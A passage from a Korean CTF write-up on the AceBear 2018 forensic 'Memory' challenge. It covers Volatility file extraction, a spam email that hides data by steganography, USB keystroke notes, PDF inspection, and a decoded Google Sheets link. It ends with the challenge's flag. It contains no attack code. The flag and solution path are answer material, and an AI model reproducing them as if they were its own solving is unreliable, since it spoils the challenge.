+10518  vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000001fcbc4c8 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./
+10519  vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000001fccbf80 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./
+10522  vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000001ff241d8 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;document.rtf 내용은 아래와 같다. mail로 보이는 내용이 기록되어 있음을 알 수 있다. (아래쪽에서 언급하겠지만, 이 document.rtf 내용이 문제를 푸는 실마리였다.)&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dear Colleague , Your email address has been submitted
+to us indicating your interest in our briefing ! If
+you are not interested in our publications and wish
+to be removed from our lists, simply do NOT respond
+and ignore this mail . This mail is being sent in compliance
+with Senate bill 2516 , Title 3 , Section 305 . THIS
+IS NOT MULTI-LEVEL MARKETING ! Why work for somebody
+else when you can become rich in 48 DAYS ! Have you
+ever noticed more people than ever are surfing the
+web and the baby boomers are more demanding than their
+parents . Well, now is your chance to capitalize on
+this ! WE will help YOU turn your business into an
+E-BUSINESS &amp;amp; decrease perceived waiting time by 180%
+! You can begin at absolutely no cost to you . But
+don't believe us . Mrs Jones who resides in Rhode Island
+tried us and says &quot;I was skeptical but it worked for
+me&quot; ! This offer is 100% legal ! So make yourself rich
+now by ordering immediately ! Sign up a friend and
+you'll get a discount of 50% . Thank-you for your serious
+consideration of our offer ! Dear Salaryman ; Thank-you
+for your interest in our briefing ! If you no longer
+wish to receive our publications simply reply with
+a Subject: of &quot;REMOVE&quot; and you will immediately be
+removed from our club ! This mail is being sent in
+compliance with Senate bill 1627 ; Title 1 ; Section
+301 . This is a ligitimate business proposal ! Why
+work for somebody else when you can become rich as
+few as 48 weeks ! Have you ever noticed more people
+than ever are surfing the web plus nearly every commercial
+on television has a .com on in it . Well, now is your
+chance to capitalize on this . We will help you increase
+customer response by 110% and turn your business into
+an E-BUSINESS ! You are guaranteed to succeed because
+we take all the risk . But don't believe us . Prof
+Simpson of Pennsylvania tried us and says &quot;I was skeptical
+but it worked for me&quot; ! We assure you that we operate
+within all applicable laws . So make yourself rich
+now by ordering immediately . Sign up a friend and
+you'll get a discount of 80% ! Thanks ! Dear Friend
+; This letter was specially selected to be sent to
+you ! We will comply with all removal requests ! This
+mail is being sent in compliance with Senate bill 1623
+; Title 9 ; Section 303 . THIS IS NOT MULTI-LEVEL MARKETING
+. Why work for somebody else when you can become rich
+within 81 DAYS . Have you ever noticed how many people
+you know are on the Internet plus nobody is getting
+any younger . Well, now is your chance to capitalize
+on this ! We will help you process your orders within
+seconds and use credit cards on your website ! You
+can begin at absolutely no cost to you . But don't
+believe us . Mrs Anderson of Colorado tried us and
+says &quot;My only problem now is where to park all my cars&quot;
+! This offer is 100% legal ! Do not go to sleep without
+ordering ! Sign up a friend and you get half off .
+Warmest regards ! Dear Business person , We know you
+are interested in receiving cutting-edge info ! If
+you no longer wish to receive our publications simply
+reply with a Subject: of &quot;REMOVE&quot; and you will immediately
+be removed from our club ! This mail is being sent
+in compliance with Senate bill 1623 ; Title 5 , Section
+308 ! This is NOT unsolicited bulk mail . Why work
+for somebody else when you can become rich inside 23
+DAYS ! Have you ever noticed nobody is getting any
+younger and society seems to be moving faster and faster
+. Well, now is your chance to capitalize on this !
+WE will help YOU deliver goods right to the customer's
+doorstep and use credit cards on your website ! You
+are guaranteed to succeed because we take all the risk
+. But don't believe us ! Ms Anderson of Montana tried
+us and says &quot;Now I'm rich, Rich, RICH&quot; ! We are a BBB
+member in good standing ! If not for you then for your
+loved ones - act now . Sign up a friend and you'll
+get a discount of 80% . Best regards .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;usb_command.rtf 내용은 아래와 같다. flag format 의 문자열 텍스트가 일부 기록되어 있는 것을 확인하고는, 너무 쉽게 flag를 찾은게 아닌가 생각했지만 역시나 flag는 아니다. 딱히, 문자열 중에 기록된 pcap 파일이 file list 내에 있는가 찾아보았지만 식별되지는 않았고, 그다지 중요하지 않은 데이터였다.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tshark -r data.pcapng -T fields -e usb.capdata &amp;gt; data2.txt  //trich xuat du lieu goi tin
+
+tshark -r data.pcap -V  // xem can goi tin
+
+tshark -r data.pcap -V | grep “Left”    // xem phan du lieu goi tin
+
+flag[pr355-0nwards-3a10134e]c
+
+flag[pr355_0nwards_3a10134e]
+
+flag[pr355_0nwards_deafcb32]
+
+FLAG{PR#%%_)NWARDS_#A!)!#$E}C
+
+
+09 f F
+0f l L
+04 a A
+0a g G
+2f [ {
+13 p P
+15 r R
+20 3 #
+22 5 %
+22 5 %
+2d - _
+27 0 )
+11 n N
+1a w W
+04 a A
+15 r R
+07 d D
+16 s S
+2d - _
+20 3 #
+04 a A
+1e 1 !
+27 0 )
+1e 1 !
+20 3 #
+21 4 $
+08 e E
+30 ] }
+
+01
+010006 c C
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;GIF 파일은 아래 이미지와 같은데, 여러 장에 기록된 GIF 를 단일 이미지로 분할하여 모두 쭉 살펴보았지만 특별히 건질만한 항목은 없었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/GIF.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] GIF.gif&lt;/p&gt;
+
+&lt;p&gt;Ethical Hacking.pdf 파일내 분명 flag와 관련된 항목이 있을거라 생각했고, Embedded pdf 에 초점을 맞춰 분석했다. peepdf를 이용해 pdf 분석을 하였으며, 아래 초기 info 를 보더라도 의심되는 항목은 검출되지 않았다. 그럼에도 stream, object를 하나씩 쭉 살펴보았지만 역시 아무것도 도움이 되는 내용은 존재하지 않았다..
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/peepdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] peepdf with Ethical Hacking.pdf&lt;/p&gt;
+
+&lt;p&gt;이번 CTF는 HackXore 친구들과 5명 정도 같이했는데 모두 외쿡인 친구들이었다. 내가 살펴본 Task 들에 대해서 알렸고, hint가 주어졌다. steganography라는 힌트가 주어졌으며, 팀원 중 한명이 document.rtf 의 내용이 Spam Message 내에 정보를 은닉시키는 steganography 기술이 적용된 것 같다는 말을 해주었다. &lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.spammimic.com/decode.shtml&lt;/code&gt;에서 spam message 에 대해 decode 작업을 수행할 수 있었으며, decode 결과 url hash 값으로 보여지는 text 를 얻을 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/spamdecode.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] spam mimic decode&lt;/p&gt;
+
+&lt;p&gt;Decode Message result : &lt;code class=&quot;highlighter-rouge&quot;&gt;1gwiPCJHiIrnZAwLB9q9ztZKrD9tbq65YnoZzXALnh6c&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;url hash format 으로 보여지는 해당 Decode 값을 가지고 문제를 어떻게 해결해야 생각하던 찰나, Memory dump 내에서 url 목록을 모두 뽑아보기로 했다. bulk extrator 를 이용해, 해당 Memory내에 존재하는 url histogram 등을 뽑으면서 동시에, strings &amp;amp; grep 조합으로 문자열 탐색을 하다가 &lt;code class=&quot;highlighter-rouge&quot;&gt;form&lt;/code&gt;이라는 hint가 나왔고, memory dump 내 url 목록들 중, google drive 문서에서 비슷한 format 을 가지는 형태가 나오는 것을 확인할 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/url.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] url format&lt;/p&gt;
+
+&lt;p&gt;이후, 개인 계정에서 Gdrive 문서들을 하나씩 열어보면서 Form을 확인했고, 아래와 같은 Form을 가지고 있는 것을 확인할 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/form.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/form2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] google drive url form&lt;/p&gt;
+
+&lt;p&gt;docement, spreadsheet 등의 url parameter에 해당 Decode Message 결과를 대입하던 중, 아래와 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;spread sheet format&lt;/code&gt;에서 공개된 문서를 열람할 수 있었으며, 해당 스프레드 시트 내에는 Flag가 기록되어 있었다.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;result url
+https://docs.google.com/spreadsheets/d/1gwiPCJHiIrnZAwLB9q9ztZKrD9tbq65YnoZzXALnh6c/edit#gid=0&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] 스프레드시트 flag&lt;/p&gt;
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;AceBear{y0u_l00k_v3ry_pr3tty!}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_acebear" /><category term="Forensic" /><category term="Writeup" /><category term="MISC" /><category term="memory" /><category term="spammer" /><summary type="html">Exercise</summary></entry></feed>
